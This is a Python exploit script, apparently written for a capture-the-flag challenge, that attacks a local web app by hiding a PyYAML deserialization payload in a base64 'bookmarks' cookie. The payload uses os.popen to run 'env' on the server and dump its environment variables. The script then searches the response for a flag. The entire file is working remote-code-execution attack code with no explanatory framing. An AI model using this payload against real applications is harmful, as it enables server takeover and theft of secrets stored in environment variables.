import base64
import requests
import re

target_url = "http://127.0.0.1:5000"

# Try using os.popen which returns a file-like object that can be read
yaml_payload = """!!python/object/apply:os.popen
args: ['env']
"""

print("[*] YAML Deserialization - Using os.popen for env capture")
print(f"[*] Payload:\n{yaml_payload}")

encoded = base64.b64encode(yaml_payload.encode()).decode()
print(f"[*] Encoded: {encoded}\n")

cookies = {
    'user': 'aea729d9fd8b4083b533db2c69e8e238',
    'bookmarks': encoded
}

print("[*] Sending request...")

try:
    response = requests.get(target_url, cookies=cookies, timeout=5)
    
    print(f"[+] Status: {response.status_code}")
    print(f"[+] Length: {len(response.text)} bytes")
    print(f"[+] Headers: {dict(response.headers)}\n")
    
    # Search for FLAG
    flags = re.findall(r'FLAG\{[A-Fa-f0-9]+\}', response.text)
    if flags:
        print(f"[!] FLAG FOUND: {flags[0]}")
    
    # Print full response
    print(f"[+] Full Response:\n{response.text}")
    
except Exception as e:
    print(f"[-] Error: {e}")

